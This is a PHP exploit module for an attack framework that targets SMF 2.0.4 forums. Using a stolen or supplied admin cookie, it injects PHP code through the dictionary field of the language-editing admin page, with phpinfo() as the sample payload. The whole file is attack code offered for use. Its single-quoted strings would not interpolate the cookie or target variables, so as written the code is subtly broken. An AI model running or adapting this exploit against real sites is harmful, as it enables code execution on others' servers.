<?php


/*
SMF 2.0.4 PHP Code Injection
Version: 1.0
Author: Logic
Date:  27 April 2013
*/


namespace exploit;
use \Framework as Framework;
     
    
   
class smf204 extends Framework {
     
       public $framework, $name, $description, $variables, $cookie;
    
   	public function __construct($framework) 
   	{
           
        	$this->framework = $framework;
        	$this->name = 'smf204';
        	$this->description = 'SMF 2.0.4 PHP Code Injection';
                   
    	        $this->variables = array(
                'cookie' => array('required' => true, 'description' => 'Enter The Admin Cookie', 'default' => ''),
            );
           
	}

	public function loadModule()
	{
		$this->setModule(1, $this->module_name);
	}

	public function installModule()
	{
		$this->addModule($this->module_name);
		$this->loadModule();
	}

	public function check()
	{
		print "This module does not support check\n";

		return 1;
	}

	public function exploit()
	{
		
		$this->run();
			
		return 1;
	}

	public function post()
	{
		print "This module does not support post Exploit\n";

		return 0;
	}

	public function run()
	{
            $cookie = 'SMFCookie956={$this->cookie}';
            $ch = curl_init('http://{$this->target}/index.php?action=admin;area=languages;sa=editlang;lid=english');

            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_COOKIE, $cookie);
            curl_setopt($ch, CURLOPT_POST, 1); 
            curl_setopt($ch, CURLOPT_POSTFIELDS, "character_set=en&locale=helloworld&dictionary=p0c\\';phpinfo();//&spelling=american&ce0361602df1=c6772abdb6d5e3f403bd65e3c3c2a2c0&save_main=Save");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

           $page = curl_exec($ch);

           echo 'PHP code:<br>'.$page;

           curl_close($ch);
	}
}

?>
